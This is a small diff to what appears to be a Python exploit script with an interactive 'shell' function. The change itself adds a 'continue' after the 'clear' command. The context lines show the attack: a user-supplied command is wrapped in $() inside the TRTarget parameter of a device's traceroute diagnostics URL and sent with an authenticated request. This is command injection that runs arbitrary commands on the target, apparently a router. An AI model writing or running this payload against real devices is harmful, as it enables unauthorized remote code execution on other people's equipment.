@@ -116,6 +116,7 @@ def shell(auth_token, stok, head):
             print("[+] Taking default command : ",cmd)
         elif cmd == "clear" :
             os.system("clear")
+            continue
             
         cmdurl = head_cmd["Referer"]+"Results?&actionDiagnosticslink=1&type=1&actionTraceroute=1&TRTarget=$("+cmd+")" 
         send_cmd = requests.get(cmdurl, headers = head_cmd)
